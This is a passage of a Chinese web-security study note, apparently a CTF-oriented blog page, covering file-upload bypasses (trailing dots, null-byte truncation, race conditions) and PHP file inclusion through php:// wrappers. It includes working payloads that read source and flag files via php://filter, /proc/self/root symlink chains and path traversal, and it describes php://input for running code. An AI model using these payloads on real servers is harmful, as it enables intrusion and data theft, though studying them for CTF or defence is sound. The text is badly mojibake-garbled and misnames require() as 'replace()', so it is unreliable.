id="2ï¼‰ç‚¹-ç©ºæ ¼-ç‚¹ç»•è¿‡"><a href="#2ï¼‰ç‚¹-ç©ºæ ¼-ç‚¹ç»•è¿‡" class="headerlink" title="2ï¼‰ç‚¹+ç©ºæ ¼+ç‚¹ç»•è¿‡"></a>2ï¼‰ç‚¹+ç©ºæ ¼+ç‚¹ç»•è¿‡</h4><blockquote><p>ä¾‹å¦‚ï¼Œåªå…è®¸ä¸Šä¼ .jpg|.png|.gifåç¼€çš„â½‚ä»¶ï¼</p><p>â— ç»•è¿‡â½…æ³•ï¼š</p><p>â—‹ é€šè¿‡æŠ“å–ä¸Šä¼ æ•°æ®åŒ…ï¼Œä¿®æ”¹ä¸Šä¼ çš„â½‚ä»¶åç¼€ï¼Œå®ç°ä¸Šä¼ ã€‚</p><p>ç»•è¿‡åŸç†ï¼š</p><p>â— åœ¨windowsç³»ç»Ÿä¸‹ï¼Œå¦‚æœâ½‚ä»¶åä»¥â€œ.â€æˆ–è€…ç©ºæ ¼ä½œä¸ºç»“å°¾ï¼Œç³»ç»Ÿä¼šâ¾ƒåŠ¨åˆ é™¤â€œ.â€ä¸ç©ºæ ¼ï¼Œåˆ©â½¤æ­¤ç‰¹æ€§</p><p>ä¹Ÿå¯ä»¥ç»•è¿‡â¿Šåå•éªŒè¯ã€‚apacheä¸­å¯ä»¥åˆ©â½¤ç‚¹ç»“å°¾å’Œç©ºæ ¼ç»•è¿‡ï¼Œaspå’Œaspxä¸­å¯ä»¥â½¤ç©ºæ ¼ç»•è¿‡ã€‚</p><p>â— ç»è¿‡è„šæœ¬â¼€ç³»åˆ—çš„å¤„ç†ä¹‹ååŸæœ¬.php. .çš„åç¼€åå˜æˆäº†.php. ï¼Œ</p><p>â½½ç”±äºWindowsçš„ç‰¹æ€§ï¼Œâ¼œå°†â½‚ä»¶æœ«å°¾çš„ç‚¹ç»™å»é™¤äº†ï¼Œ</p><p>æœ€ç»ˆå°±å­˜çš„æ—¶å€™.phpçš„â½‚ä»¶ã€‚åŒç†ä¹Ÿå¯ä»¥ä¸Šä¼ .htaccess. .ç­‰â½‚ä»¶ã€‚ã€‚ã€‚</p><p>(å°±ç®—æ²¡æœ‰ç»è¿‡è„šæœ¬çš„å¤„ç†,.php. .åœ¨windowsä¸­ä¹Ÿæ˜¯ä¼šè¢«å­˜å‚¨ä¸º.php)</p></blockquote><h4 id="3ï¼‰00æˆªæ–­"><a href="#3ï¼‰00æˆªæ–­" class="headerlink" title="3ï¼‰00æˆªæ–­"></a>3ï¼‰00æˆªæ–­</h4><blockquote><p>ç»•è¿‡åŸç†ï¼š</p><p>â— è¿™æ—¶å€™å°±è¦åˆ©â½¤0x00æˆªæ–­åŸç†äº†ï¼Œå…·ä½“åŸç†æ˜¯ ç³»ç»Ÿåœ¨å¯¹â½‚ä»¶åçš„è¯»å–æ—¶ï¼Œå¦‚æœé‡åˆ°0x00ï¼Œå°±ä¼šè®¤</p><p>ä¸ºè¯»å–å·²ç»“æŸã€‚</p><p>â— ä½†è¦æ³¨æ„æ˜¯â½‚ä»¶çš„16è¿›åˆ¶å†…å®¹â¾¥çš„00ï¼Œâ½½ä¸æ˜¯â½‚ä»¶åä¸­çš„00 ï¼ï¼ï¼å°±æ˜¯è¯´ç³»ç»Ÿæ˜¯æŒ‰16è¿›åˆ¶è¯»å–â½‚</p><p>ä»¶ï¼ˆæˆ–è€…è¯´â¼†è¿›åˆ¶ï¼‰ï¼Œ</p><p>â— é‡åˆ°asciiç ä¸ºé›¶çš„ä½ç½®å°±åœâ½Œï¼Œâ½½è¿™ä¸ªasciiç ä¸ºé›¶çš„ä½ç½®åœ¨16è¿›åˆ¶ä¸­æ˜¯00ï¼Œâ½¤0xå¼€å¤´è¡¨ç¤º16è¿›</p><p>åˆ¶ï¼Œä¹Ÿå°±æ˜¯æ‰€è¯´çš„0x00æˆªæ–­</p><p>â— å½“ç³»ç»Ÿè¯»å–åˆ°0x00æ—¶ï¼Œè®¤ä¸ºå·²ç»ç»“æŸï¼Œä¸ä¼šå†è¯»å–åâ¾¯å°†è¦æ‹¼æ¥çš„13.jpg,è®¤ä¸ºæ˜¯phpâ½‚ä»¶ï¼Œ</p><p>å®Œæˆç»•è¿‡ã€‚</p><p>%<strong>00</strong>æˆªæ–­ ä¸ <strong>0</strong>x<strong>00</strong>æˆªæ–­çš„åŒºåˆ«ï¼Ÿ</p><p>â— åœ°å€ä¸Šâ¾¯â½‚ä»¶å‘½åçš„åŒºåˆ«ã€‚</p><p>â— %00ä¸Šæ˜¯å»ºâ½´åœ¨åœ°å€ä¿¡æ¯ä¸Šçš„</p><p>â— 0x00 â½‚ä»¶</p><p>â— æ“ä½œâ½…æ³•åŸºæœ¬â¼€è‡´ã€‚</p><p>%<strong>00</strong>æˆªæ–­ ä¸ <strong>0</strong>x<strong>00</strong>æˆªæ–­çš„å®æˆ˜ä¸­çš„åŒºåˆ«ï¼Ÿ</p><p>â— å¹³æ—¶â¼€å®šè¦å¤šè§‚å¯Ÿâ¼€ä¸‹æ•°æ®åŒ…ï¼Œæ•°æ®åŒ…ä¸­åŒ…å«äº†å¾ˆå¤šå‚æ•°ï¼Œå¾ˆå¤šå‚æ•°å¯ä»¥è¿›â¾ä¿®æ”¹ã€‚</p></blockquote><h4 id="4ï¼‰äºŒæ¬¡æ¸²æŸ“-æ¡ä»¶ç«äº‰"><a href="#4ï¼‰äºŒæ¬¡æ¸²æŸ“-æ¡ä»¶ç«äº‰" class="headerlink" title="4ï¼‰äºŒæ¬¡æ¸²æŸ“+æ¡ä»¶ç«äº‰"></a>4ï¼‰äºŒæ¬¡æ¸²æŸ“+æ¡ä»¶ç«äº‰</h4><blockquote><p>â¼†æ¬¡æ¸²æŸ“ï¼šå°±æ˜¯æ ¹æ®â½¤æˆ·ä¸Šä¼ çš„å›¾â½šï¼Œæ–°â½£æˆâ¼€ä¸ªå›¾â½šï¼Œå°†åŸå§‹å›¾â½šåˆ é™¤ï¼Œå°†æ–°å›¾â½šæ·»åŠ åˆ°æ•°æ®åº“ä¸­ã€‚<br>â½å¦‚â¼€äº›â½¹ç«™æ ¹æ®â½¤æˆ·ä¸Šä¼ çš„å¤´åƒâ½£æˆâ¼¤ä¸­â¼©ä¸åŒå°ºâ¼¨çš„å›¾åƒ</p></blockquote><blockquote><p>æ¡ä»¶ç«äº‰å°±æ˜¯åœ¨ï¼Œå½“äºŒæ¬¡æ¸²æŸ“å…ˆæŠŠæ–‡ä»¶ç§»åŠ¨åˆ°å‚¨å­˜ç›®å½•åï¼Œæ‰åˆ¤æ–­æ–‡ä»¶æ˜¯å¦åˆæ³•æ—¶<br>å°±äº§â½£äº†æ¼æ´ï¼Œä¼šæœ‰â¼€ä¸ªçŸ­æš‚çš„æ—¶é—´å°†æˆ‘ä»¬ä¸Šä¼ çš„webshellå­˜å‚¨åœ¨â½¬å½•ä¸‹ï¼Œä¸”ä»¥æˆ‘ä»¬ä¸Šä¼ çš„<br>â½‚ä»¶åçš„å½¢å¼</p><p>ä½†æ˜¯è¿™ä¸ªæ—¶é—´ç›¸å½“ç›¸å½“çŸ­æš‚ï¼Œä»¥â¾„äºï¼Œä½ æ‰“å¼€ä¸Šä¼ â½¬å½•ï¼Œç‚¹å‡»ä¸Šä¼ â½‚ä»¶ï¼Œä½ è¿å½±â¼¦éƒ½çœ‹ä¸åˆ°å°±å·²ç»<br>æ²¡äº†ï¼Œ</p><p>æ‰€ä»¥è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿â½¤burpsuiteï¼Œæˆ‘ä»¬å…ˆæŠ“åŒ…ï¼Œç„¶åå‘é€åˆ°intruderæ¨¡å—ã€‚<br>ç‚¹å‡»clearå»é™¤æ‰€æœ‰å‚æ•°ï¼Œç„¶åpayloadé€‰æ‹©â½†ï¼Œå¹¶ä¸”é€‰æ‹©æŒç»­å‘åŒ…ã€‚</p></blockquote><blockquote><p>â¼†æ¬¡æ¸²æŸ“åªèƒ½é è¿™ä¸ªæ¡ä»¶ç«äº‰å»ç»•è¿‡ä¹ˆï¼Ÿ<br>â—‹ â¼†æ¬¡æ¸²æŸ“ï¼šè¯´çš„æ˜¯è¿™ä¸ªæŠ€æœ¯å«åšâ¼†æ¬¡æ¸²æŸ“ï¼Œä¸æ˜¯è¯´â¼†æ¬¡æ¸²æŸ“æœ‰æ¼æ´ã€‚<br>â—‹ æœ‰æ¼æ´å¯åˆ©â½¤çš„åŸå› æ˜¯å› ä¸ºï¼Œä»–æ˜¯åœ¨â½‚ä»¶ä¸Šä¼ ä¹‹åæ‰æœ‰çš„åç»­æ“ä½œï¼Œç¬¬â¼€æ­¥çš„æ—¶å€™å·²ç»å°†â½‚ä»¶<br>ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šäº†ã€‚<br>â—‹ å¦‚æœè¿™ä¸ªâ¼†æ¬¡æ¸²æŸ“åœ¨ç¬¬â¼€æ­¥ä¹‹å‰ï¼Œè¿™ä¸ªâ¼†æ¬¡æ¸²æŸ“æ˜¯æ²¡æœ‰ä»»ä½•é—®é¢˜çš„ã€‚<br>â—‹ â¼†æ¬¡æ¸²æŸ“ä¸æ˜¯æ¼æ´ï¼Œæ˜¯â¼€ç§æŠ€æœ¯ï¼Œæ˜¯â¼€ç§é€»è¾‘ä¸Šçš„éªŒè¯ï¼Œæ¡ä»¶ç«äº‰ã€‚<br>â—‹ åˆ©â½¤æ¡ä»¶ç«äº‰ï¼Œé˜²â½Œä»–ç¬¬â¼†æ­¥æ“ä½œ</p></blockquote><hr><h2 id="ä¸ƒã€fileinclude"><a href="#ä¸ƒã€fileinclude" class="headerlink" title="ä¸ƒã€fileinclude"></a>ä¸ƒã€fileinclude</h2><h3 id="1-æ–‡ä»¶åŒ…å«çš„å››ä¸ªå‡½æ•°ï¼š"><a href="#1-æ–‡ä»¶åŒ…å«çš„å››ä¸ªå‡½æ•°ï¼š" class="headerlink" title="1.æ–‡ä»¶åŒ…å«çš„å››ä¸ªå‡½æ•°ï¼š"></a>1.æ–‡ä»¶åŒ…å«çš„å››ä¸ªå‡½æ•°ï¼š</h3><p>1.include():å°†åœ¨å…¶è¢«è°ƒç”¨çš„ä½ç½®å¤„åŒ…å«ä¸€ä¸ªæ–‡ä»¶ã€‚åŒ…å«ä¸€ä¸ªæ–‡ä»¶ä¸åœ¨è¯¥è¯­å¥æ‰€åœ¨ä½ç½®å¤åˆ¶åˆ¶å®šæ–‡ä»¶çš„æ•°æ®å…·æœ‰ç›¸åŒå†…å®¹çš„æ•ˆæœã€‚ä½¿ç”¨include()æ—¶å¯ä»¥å¿½ç•¥æ‹¬å·ã€‚</p><p>2.include_once():åœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ã€‚æ­¤è¡Œä¸ºå’Œ include() è¯­å¥ç±»ä¼¼ï¼Œ<u><strong>å”¯ä¸€åŒºåˆ«æ˜¯include_once()ä¼šå…ˆåˆ¤æ–­ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶åœ¨ä¹‹å‰æ˜¯å¦å·²ç»è¢«åŒ…å«è¿‡ï¼Œå¦‚å·²ç»åŒ…å«ï¼Œåˆ™å¿½ç•¥æœ¬æ¬¡åŒ…å«ã€‚</strong></u></p><p>3.replace() :å¾ˆå¤§ç¨‹åº¦ä¸Šä¸includeç›¸åŒï¼Œéƒ½æ˜¯å°†ä¸€ä¸ªæ¨¡æ¿æ–‡ä»¶åŒ…å«åˆ°requireè°ƒç”¨ååœ¨çš„ä½ç½®ã€‚</p><p>requireå’Œincludeä¹‹é—´æœ‰ä¸¤ç‚¹é‡è¦çš„åŒºåˆ«:</p><p>1.æ— è®ºrequireçš„ä½ç½®å¦‚ä½•ï¼Œåˆ¶å®šæ–‡ä»¶éƒ½å°†åŒ…å«åˆ°å‡ºç°requireçš„è„šæœ¬ä¸­ã€‚ä¾‹å¦‚ï¼Œå³ä½¿requireæ”¾åœ¨è®¡ç®—ç»“æœä¸ºå‡çš„ifè¯­å¥ä¸­ï¼Œä¾ç„¶ä¼šåŒ…å«æŒ‡å®šæ–‡ä»¶ã€‚<br>2.requireå‡ºé”™æ—¶ï¼Œè„šæœ¬å°†åœæ­¢è¿è¡Œï¼Œè€Œåœ¨ä½¿ç”¨includeçš„æƒ…å†µä¸‹ï¼Œè„šæœ¬å°†ç»§ç»­æ‰§è¡Œã€‚</p><p>4.replace_once():åœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ã€‚æ­¤è¡Œä¸ºå’Œ require() è¯­å¥ç±»ä¼¼ï¼Œ<u><strong>å”¯ä¸€åŒºåˆ«æ˜¯require_once()ä¼šå…ˆåˆ¤æ–­ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶åœ¨ä¹‹å‰æ˜¯å¦å·²ç»è¢«åŒ…å«è¿‡ï¼Œå¦‚å·²ç»åŒ…å«ï¼Œåˆ™å¿½ç•¥æœ¬æ¬¡åŒ…å«</strong></u></p><h4 id="require-once-å¤šæ¬¡åŒ…å«"><a href="#require-once-å¤šæ¬¡åŒ…å«" class="headerlink" title="*require_once()å¤šæ¬¡åŒ…å«"></a><code>*require_once()</code>å¤šæ¬¡åŒ…å«</h4><p><u><strong>ä¸‹é¢æ˜¯ä¸€ç¯‡å…³äº<code>require_onceè¢«ä½¿ç”¨åä¸èƒ½å†ä½¿ç”¨æ€ä¹ˆç»•å¼€</code>çš„æ–‡ç« ï¼Œæœ¬äººåœ¨2022å¹´5æœˆDest0g3äºŒæ¬¡æ‹›æ–°æ¯”èµ›é‡åˆ°ç±»ä¼¼ï¼Œç‰¹æ­¤è®°å½•</strong></u></p><blockquote><p><a href="https://www.anquanke.com/post/id/213235">phpæºç åˆ†æ require_once ç»•è¿‡ä¸èƒ½é‡å¤åŒ…å«æ–‡ä»¶çš„é™åˆ¶</a></p></blockquote><blockquote><p><code>require_once()</code><br>åœ¨å¯¹è½¯é“¾æ¥çš„æ“ä½œä¸Šå­˜åœ¨ä¸€äº›ç¼ºé™·ï¼Œè½¯è¿æ¥å±‚æ•°è¾ƒå¤šä¼šä½¿hashåŒ¹é…ç›´æ¥å¤±æ•ˆé€ æˆé‡å¤åŒ…å«ï¼Œè¶…è¿‡20æ¬¡è½¯é“¾æ¥åå¯ä»¥ç»•è¿‡ï¼Œå¤–åŠ ä¼ªåè®®ç¼–ç ä¸€ä¸‹ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>var<span class="regexp">/www/</span>html/flag.php</span><br></pre></td></tr></table></figure></blockquote><p>ä¸‹é¢è¯¥é¢˜ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="comment">//find something in flag1.php </span></span><br><span class="line"><span class="variable">$d</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]; </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$d</span>, FILTER_VALIDATE_URL)) &#123;   </span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$d</span>);   </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>)) &#123;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;lai&quot;</span>) !== <span class="literal">false</span> &amp;&amp;</span><br><span class="line">  <span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;ya&quot;</span>) !== <span class="literal">false</span>)  &#123;       </span><br><span class="line">            @<span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);     </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;       </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Sorry, you can not pass&quot;</span>);     </span><br><span class="line">        &#125;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/labour$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;   </span><br><span class="line">                  @<span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$d</span>);       </span><br><span class="line">                  <span class="keyword">echo</span> (<span class="variable">$a</span>);     </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;                                      <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);     </span><br><span class="line">                                    &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;why?&quot;</span>);   </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Invalid URL&quot;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>æ–‡ç« å…³é”®ï¼š</strong></p><p><u><strong>phpçš„æ–‡ä»¶åŒ…å«æœºåˆ¶æ˜¯å°†å·²ç»åŒ…å«çš„æ–‡ä»¶ä¸æ–‡ä»¶çš„çœŸå®è·¯å¾„æ”¾è¿›å“ˆå¸Œè¡¨ä¸­ï¼Œå½“å·²ç»<code>require_once(&#39;flag.php&#39;)</code>ï¼Œå·²ç»includeçš„æ–‡ä»¶ä¸å¯ä»¥å†require_onceã€‚</strong></u></p><p><u><strong>ä»Šå¤©å°±æ¥è°ˆè°ˆï¼Œæ€ä¹ˆè®¾æƒ³å¦‚ä½•ç»•è¿‡è¿™ä¸ªå“ˆå¸Œè¡¨ï¼Œè®©phpè®¤ä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ–‡ä»¶åä¸åœ¨å“ˆå¸Œè¡¨ä¸­ï¼Œåˆå¯ä»¥è®©phpèƒ½æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œè¯»å–åˆ°å†…å®¹ã€‚</strong></u></p><p><u><strong>åœ¨è¿™é‡Œæœ‰ä¸ªå°çŸ¥è¯†ç‚¹ï¼Œ<code>/proc/self</code>æŒ‡å‘å½“å‰è¿›ç¨‹çš„<code>/proc/pid/</code>ï¼Œ<code>/proc/self/root/</code>æ˜¯æŒ‡å‘<code>/</code>çš„ç¬¦å·é“¾æ¥ï¼Œæƒ³åˆ°è¿™é‡Œï¼Œç”¨ä¼ªåè®®é…åˆå¤šçº§ç¬¦å·é“¾æ¥çš„åŠæ³•è¿›è¡Œç»•è¿‡</strong></u></p><p>payload:</p><p>?d&#x3D;0:&#x2F;&#x2F;labour&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flll1ag2.txt&amp;ctf&#x3D;laiya</p><h3 id="2-phpä¼ªåè®®ï¼š"><a href="#2-phpä¼ªåè®®ï¼š" class="headerlink" title="2.phpä¼ªåè®®ï¼š"></a>2.phpä¼ªåè®®ï¼š</h3><p>å†…å®¹æ¥è‡ªäº<a href="https://blog.csdn.net/qz362228/article/details/124359070">https://blog.csdn.net/qz362228/article/details/124359070</a></p><p><img src="https://img-blog.csdnimg.cn/92c9df98952f41669db5d8b8b2ffaead.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LmU5rK7Nzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h4 id="1-php-x2F-x2F-åè®®"><a href="#1-php-x2F-x2F-åè®®" class="headerlink" title="1.php:&#x2F;&#x2F;åè®®"></a>1.php:&#x2F;&#x2F;åè®®</h4><p><strong>Â·æ¡ä»¶ï¼š</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:<span class="keyword">off</span>/<span class="keyword">on</span></span><br><span class="line">allow_url_include #ä»…php://<span class="keyword">input</span> php://stdin php://memory php://<span class="keyword">temp</span> éœ€è¦<span class="keyword">on</span></span><br></pre></td></tr></table></figure><p><strong>Â·ä½œç”¨ï¼š</strong></p><blockquote><p><code>php://</code> è®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµï¼ˆI&#x2F;O streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯<code>php://filter</code>å’Œ<code>php://input</code>ï¼Œ<code>php://filter</code>ç”¨äº<strong>è¯»å–æºç </strong>ï¼Œ<code>php://input</code>ç”¨äº<strong>æ‰§è¡Œphpä»£ç </strong>ã€‚</p></blockquote><p><strong>Â·è¯´æ˜</strong>ï¼š</p><blockquote><p>PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥&#x2F;è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ<br>å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨</p></blockquote><h4 id="2-php-x2F-x2F-filterä¼ªåè®®"><a href="#2-php-x2F-x2F-filterä¼ªåè®®" class="headerlink" title="2.php:&#x2F;&#x2F;filterä¼ªåè®®"></a>2.php:&#x2F;&#x2F;filterä¼ªåè®®</h4><p><strong>Â·æ¡ä»¶</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br><span class="line"><span class="attr">allow_url_include</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br></pre></td></tr></table></figure><blockquote><p>åªæ˜¯<code>è¯»å–</code>ï¼Œéœ€è¦å¼€å¯<code>allow_url_fopen</code>ï¼Œä¸éœ€è¦å¼€å¯<code>allow_url_include</code></p></blockquote><p><strong>Â·è¯´æ˜ï¼š</strong></p><blockquote><p>å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºâ€æ•°æ®æµæ‰“å¼€â€æ—¶çš„â€ç­›é€‰è¿‡æ»¤â€åº”ç”¨ï¼Œå¯¹æœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å†™<br>â‘ è¾“å‡ºè¿›è¡Œ<code>base64</code>åŠ å¯†åçš„ä¿¡æ¯</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=xx.php</span><br></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=xx.php</span><br></pre></td></tr></table></figure><p>â‘¡è·å¾—å°†base64åŠ å¯†åçš„ä¿¡æ¯åï¼Œå†å°†å…¶è§£å¯†ï¼Œå¾—å‡ºåŸä¿¡æ¯</p></blockquote><h5 id="ç»•è¿‡baseè¿‡æ»¤"><a href="#ç»•è¿‡baseè¿‡æ»¤" class="headerlink" title="ç»•è¿‡baseè¿‡æ»¤"></a>ç»•è¿‡baseè¿‡æ»¤</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/string.rot13/</span>resource=flag.php</span><br></pre></td></tr></table></figure><blockquote><p>ROT13 ç¼–ç ç®€å•åœ°ä½¿ç”¨å­—æ¯è¡¨ä¸­åé¢ç¬¬ 13 ä¸ªå­—æ¯æ›¿æ¢å½“å‰å­—æ¯ï¼ŒåŒæ—¶å¿½ç•¥éå­—æ¯è¡¨ä¸­çš„å­—ç¬¦ã€‚</p></blockquote><h4 id="3-php-x2F-x2F-inputï¼ˆè¯»å–POSTæ•°æ®ï¼‰"><a href="#3-php-x2F-x2F-inputï¼ˆè¯»å–POSTæ•°æ®ï¼‰" class="headerlink" title="3.php:&#x2F;&#x2F;inputï¼ˆè¯»å–POSTæ•°æ®ï¼‰"></a>3.php:&#x2F;&#x2F;inputï¼ˆè¯»å–POSTæ•°æ®ï¼‰</h4><p><strong>Â·æ¡ä»¶</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br><span class="line"><span class="attr">allow_url_include</span>=<span class="literal">on</span></span><br></pre></td></tr></table></figure><p><strong>Â·è¯´æ˜</strong></p><blockquote><p>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµã€‚åœ¨postè¯·æ±‚ä¸­èƒ½æŸ¥çœ‹è¯·æ±‚çš„åŸå§‹æ•°æ®ï¼Œ<u><strong>å¹¶å°†postè¯·æ±‚ä¸­çš„postæ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œ</strong></u>ã€‚ï¼ˆåªè¯»æµæ˜¯è¯´åªèƒ½è¿›è¡Œè¯»æ“ä½œçš„æ•°æ®ï¼‰</p></blockquote><p><code>ä¾‹å¦‚</code></p><p>ä¸‹é¢çš„POSTæ•°æ®é‡Œçš„å‘½ä»¤å°±ä¼šè¢«æ‰§è¡Œ</p><p><img src="/2022/05/28/Web-study/image-20220801143739625.png" alt="image-20220801143739625"></p><blockquote><p>å³å¯ä»¥<u>ç›´æ¥è¯»å–åˆ°POSTä¸Š</u>æ²¡æœ‰ç»è¿‡è§£æçš„åŸå§‹æ•°æ®ã€‚ <strong>enctype&#x3D;â€multipart&#x2F;form-dataâ€</strong> çš„æ—¶å€™ php:&#x2F;&#x2F;input æ˜¯<strong>æ— æ•ˆ</strong>çš„</p></blockquote><p><code>æ³¨</code> ï¼š</p><blockquote><p>æŸ¥çœ‹å½“å‰è¿è¡Œçš„æ˜¯å“ªä¸ªphp.ini<br>2,3éœ€è¦å°†phpå¯æ‰§è¡ŒåŠ å…¥ç¯å¢ƒå˜é‡, å¦‚æœæ²¡æœ‰åŠ ,é‚£ä¹ˆè¯·ä½¿ç”¨phpå¯æ‰§è¡Œæ–‡ä»¶æ‰€åœ¨ä½ç½®çš„å®Œæ•´è·¯å¾„ä»£æ›¿</p></blockquote><blockquote><ol><li></li></ol><p>æ‰“å°å‡º<code>phpinfo();</code> æ‰¾åˆ°<code>Loaded Configuration File</code>é‚£ä¸€è¡Œ</p></blockquote><p><img src="https://img-blog.csdnimg.cn/09dde2a7f84145e291c34a1b2f19e26e.png" alt="https://img-blog.csdnimg.cn/09dde2a7f84145e291c34a1b2f19e26e.png"></p><blockquote><ol start="2"><li></li></ol><p>å‘½ä»¤è¡Œè¾“å…¥</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">php</span> -<span class="variable">i</span> |<span class="variable">grep</span> <span class="variable">php.ini</span>ï¼ˆ<span class="variable">php</span> -<span class="variable">i</span>å…¶å®å°±æ˜¯è¾“å‡º<span class="function"><span class="title">phpinfo</span>();)</span></span><br></pre></td></tr></table></figure><ol start="3"><li></li></ol><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r 